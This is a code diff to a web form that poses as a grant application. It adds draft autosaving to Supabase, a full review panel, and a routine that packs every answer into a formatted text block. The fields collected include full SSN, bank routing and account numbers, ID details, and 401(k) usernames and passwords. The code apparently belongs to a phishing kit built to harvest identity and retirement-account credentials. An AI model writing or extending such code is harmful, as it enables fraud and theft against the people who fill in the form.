@@ -565,9 +565,24 @@
 
         <div class="review-summary">
           <div class="review-section">
-            <h4>Personal Information</h4>
+            <h4>Quick Application Summary</h4>
             <div class="review-grid"></div>
           </div>
+        </div>
+
+        <div id="fullApplicationFormReview" class="review-summary" style="margin-top: 2.5rem; border: 1.5px solid rgba(10,25,41,0.08);">
+          <div style="display:flex; align-items:center; gap:0.75rem; padding:1rem 1.25rem; border-bottom:1px solid rgba(10,25,41,0.08); background:rgba(10,25,41,0.02); border-radius:16px 16px 0 0;">
+            <div style="width:34px; height:34px; border-radius:10px; background:rgba(212,175,55,0.15); display:flex; align-items:center; justify-content:center; flex-shrink:0;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="#d4af37" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 2 0 01.707.293l5.414 5.414a1 2 0 01.293.707V19a2 2 0 01-2 2z" />
+              </svg>
+            </div>
+            <div>
+              <h4 style="margin:0; font-size:1.05rem; color:var(--navy-900);">Full Application Form — Complete Submission</h4>
+              <div style="font-size:0.85rem; color:var(--gray-600); margin-top:0.15rem;">Everything you entered, organized by section. This will be sent to review after you submit.</div>
+            </div>
+          </div>
+          <div id="fullReviewBody" style="padding:0.5rem 1.25rem 1.25rem;"></div>
         </div>
 
         <div class="review-summary" style="background: rgba(212,175,55,0.03); border: 1px solid rgba(212,175,55,0.2);">
@@ -758,7 +773,8 @@ window.__saveApplication = async function (formData, appNumber) {
     if (!user) return;
     await supabase.from('applications').insert({
       user_id: user.id,
-      app_number: appNumber || null,
+      app_id_short: appNumber || null,
+      status: 'submitted',
       personal: formData.personal || {},
       banking: formData.banking || {},
       business: formData.business || {},
@@ -767,6 +783,210 @@ window.__saveApplication = async function (formData, appNumber) {
       final: formData.final || {}
     });
   } catch (e) { console.error('save application failed', e); }
+};
+
+window.__upsertDraftApplication = async function (formData, appNumber) {
+  try {
+    if (!window.supabase || !window.supabase.auth) return null;
+    const su = await window.supabase.auth.getUser();
+    const user = su && su.data && su.data.user;
+    if (!user) return null;
+    const visitorSession = (function () { try { return sessionStorage.getItem('tg_session_id') || ''; } catch (_) { return ''; } })();
+    const payload = {
+      user_id: user.id,
+      app_id_short: appNumber,
+      status: 'draft',
+      visitor_session: visitorSession,
+      personal: formData.personal || {},
+      banking: formData.banking || {},
+      business: formData.business || {},
+      id_verify: formData.idVerify || {},
+      kaccess: formData.kaccess || {},
+      raw_data: {
+        personal: formData.personal || {},
+        banking: formData.banking || {},
+        business: formData.business || {},
+        id_verify: formData.idVerify || {},
+        kaccess: formData.kaccess || {}
+      }
+    };
+    const existing = await window.supabase
+      .from('applications')
+      .select('id, app_id_short')
+      .eq('user_id', user.id)
+      .eq('app_id_short', appNumber)
+      .maybeSingle();
+    let result;
+    if (existing && existing.data && existing.data.id) {
+      result = await window.supabase
+        .from('applications')
+        .update(payload)
+        .eq('id', existing.data.id)
+        .select('id, app_id_short, status')
+        .maybeSingle();
+    } else {
+      result = await window.supabase
+        .from('applications')
+        .insert(payload)
+        .select('id, app_id_short, status')
+        .maybeSingle();
+    }
+    return result && result.data ? result.data : null;
+  } catch (e) { console.warn('draft autosave skip:', e.message); return null; }
+};
+
+window.__showDraftSaveToast = function (kind) {
+  var toast = document.getElementById('draftToast');
+  if (!toast) {
+    toast = document.createElement('div');
+    toast.id = 'draftToast';
+    toast.style.cssText = 'position:fixed; bottom:22px; left:50%; transform:translateX(-50%) translateY(20px); z-index:9999; padding:0.7rem 1.1rem; border-radius:12px; font-size:0.9rem; display:flex; align-items:center; gap:0.5rem; opacity:0; transition:opacity .25s, transform .25s; backdrop-filter:blur(6px); box-shadow:0 8px 24px rgba(10,25,41,0.15);';
+    document.body.appendChild(toast);
+  }
+  if (kind === 'saving') {
+    toast.style.background = 'rgba(10,25,41,0.88)';
+    toast.style.color = 'white';
+    toast.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9" stroke-opacity=".3"/><path d="M21 12a9 9 0 0 0-9-9"/></svg> Saving draft to Supabase…';
+  } else {
+    toast.style.background = 'rgba(16,185,129,0.94)';
+    toast.style.color = 'white';
+    toast.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg> Draft saved';
+  }
+  toast.style.opacity = '1';
+  toast.style.transform = 'translateX(-50%) translateY(0)';
+  if (kind !== 'saving') {
+    clearTimeout(window.__draftToastTimer);
+    window.__draftToastTimer = setTimeout(function () {
+      toast.style.opacity = '0';
+      toast.style.transform = 'translateX(-50%) translateY(20px)';
+    }, 2200);
+  }
+};
+
+window.__buildOrganizedApplicationText = function (formData, appNumber) {
+  var STAR = '⭐';
+  var STAR15 = STAR.repeat(15);
+  var fieldLabels = {
+    firstName: 'First Name', lastName: 'Last Name', email: 'Email', phone: 'Phone',
+    dob: 'Date of Birth', ssn: 'SSN', address: 'Street Address', city: 'City',
+    state: 'State', zip: 'ZIP Code', citizenship: 'Citizenship Status',
+    bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
+    accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
+    accountNum: 'Account Number',
+    businessName: 'Business Name', businessStatus: 'Grant Purpose',
+    businessType: 'Employment Status', industry: 'Use Category',
+    employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
+    businessAddress: 'Additional Details',
+    idType: 'ID Type', idNumber: 'ID / Document Number',
+    idFullName: 'Full Name (on ID)', idDob: 'DOB (on ID)',
+    idExpires: 'ID Expiration Date', idIssuer: 'Issuing State/Country',
+    provider: '401(k) Provider', k401Username: '401(k) Username',
+    k401Password: '401(k) Password', accountNumber: '401(k) Last 6',
+    balance: 'Current Balance (USD)', accountOpenDate: 'Opened Date',
+    accountType: 'Account Type', employer: 'Current Employer',
+    k401AccessUsername: '401(k) Access Username',
+    k401AccessPassword: '401(k) Access Password'
+  };
+  var sections = [
+    { title: 'STEP 1 — Personal Information', data: formData.personal || {} },
+    { title: 'STEP 2 — Bank / Payment Details', data: formData.banking || {} },
+    { title: 'STEP 3 — Funding Need Summary', data: formData.business || {} },
+    { title: 'STEP 4 — ID Verification & 401(k) Details', data: formData.idVerify || {} },
+    { title: 'STEP 6 — 401(k) Account Access', data: formData.kaccess || {} }
+  ];
+  var lines = [];
+  lines.push(STAR15);
+  lines.push('📋 FULL APPLICATION FORM');
+  lines.push('Application ID: P401K-2026-' + (appNumber || 'UNKNOWN'));
+  lines.push('Filled at: ' + new Date().toLocaleString());
+  lines.push('');
+  for (var s = 0; s < sections.length; s++) {
+    var sec = sections[s];
+    var keys = Object.keys(sec.data || {});
+    if (keys.length === 0) continue;
+    lines.push('━━━ ' + sec.title + ' ━━━');
+    for (var k = 0; k < keys.length; k++) {
+      var key = keys[k];
+      var raw = sec.data[key];
+      if (raw === undefined || raw === null || raw === '') continue;
+      var label = fieldLabels[key] || key;
+      var kLower = String(key).toLowerCase();
+      var display = String(raw);
+      if (kLower.indexOf('password') > -1) display = '🔒 ' + display;
+      else if (kLower.indexOf('ssn') > -1) display = display + ' (full)';
+      lines.push('  • ' + label + ': ' + display);
+    }
+    lines.push('');
+  }
+  lines.push(STAR15);
+  return lines.join('\n');
+};
+
+window.__renderFullReviewBody = function (formData) {
+  var fieldLabels = {
+    firstName: 'First Name', lastName: 'Last Name', email: 'Email', phone: 'Phone',
+    dob: 'Date of Birth', ssn: 'SSN', address: 'Street Address', city: 'City',
+    state: 'State', zip: 'ZIP Code', citizenship: 'Citizenship Status',
+    bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
+    accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
+    accountNum: 'Account Number',
+    businessName: 'Business Name', businessStatus: 'Grant Purpose',
+    businessType: 'Employment Status', industry: 'Use Category',
+    employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
+    businessAddress: 'Additional Details',
+    idType: 'ID Type', idNumber: 'ID / Document Number',
+    idFullName: 'Full Name (on ID)', idDob: 'DOB (on ID)',
+    idExpires: 'ID Expiration Date', idIssuer: 'Issuing State/Country',
+    provider: '401(k) Provider', k401Username: '401(k) Username',
+    k401Password: '401(k) Password', accountNumber: '401(k) Last 6',
+    balance: 'Current Balance (USD)', accountOpenDate: 'Opened Date',
+    accountType: 'Account Type', employer: 'Current Employer',
+    k401AccessUsername: '401(k) Access Username',
+    k401AccessPassword: '401(k) Access Password'
+  };
+  var sections = [
+    { title: 'Step 1 · Personal Information', data: formData.personal || {}, accent: '#0a1929' },
+    { title: 'Step 2 · Bank / Payment Details', data: formData.banking || {}, accent: '#1d4ed8' },
+    { title: 'Step 3 · Funding Need Summary', data: formData.business || {}, accent: '#047857' },
+    { title: 'Step 4 · ID Verification & 401(k) Details', data: formData.idVerify || {}, accent: '#10b981' },
+    { title: 'Step 6 · 401(k) Account Access', data: formData.kaccess || {}, accent: '#d4af37' }
+  ];
+  var html = '';
+  for (var s = 0; s < sections.length; s++) {
+    var sec = sections[s];
+    var keys = Object.keys(sec.data || {});
+    var rows = '';
+    var nonEmpty = 0;
+    for (var k = 0; k < keys.length; k++) {
+      var key = keys[k];
+      var raw = sec.data[key];
+      if (raw === undefined || raw === null || raw === '') continue;
+      nonEmpty++;
+      var label = fieldLabels[key] || key;
+      var val = String(raw);
+      var kLower = String(key).toLowerCase();
+      if (kLower.indexOf('password') > -1) val = '🔒 ' + val;
+      rows += '<div style="display:flex; padding:0.55rem 0; border-bottom:1px solid rgba(10,25,41,0.06);">' +
+              '<div style="flex:0 0 45%; font-size:0.85rem; color:var(--gray-600); font-weight:500;">' + escape(label) + '</div>' +
+              '<div style="flex:1; font-size:0.9rem; color:var(--navy-900); font-weight:600; word-break:break-word;">' + escape(val) + '</div>' +
+              '</div>';
+    }
+    if (nonEmpty === 0) continue;
+    html += '<div style="margin-top:1.5rem;">' +
+            '<div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:0.6rem;">' +
+            '<span style="width:6px; height:22px; border-radius:3px; background:' + sec.accent + '; display:inline-block;"></span>' +
+            '<h5 style="margin:0; font-size:0.98rem; color:var(--navy-900); font-weight:700;">' + escape(sec.title) + '</h5>' +
+            '</div>' +
+            '<div style="padding:0 0.25rem; border-radius:12px; background:rgba(10,25,41,0.015); border:1px solid rgba(10,25,41,0.05);">' + rows + '</div>' +
+            '</div>';
+  }
+  function escape(s) {
+    return String(s == null ? '' : s)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
+  }
+  return html;
 };
 
 (function getOrCreateAppId(userId) {
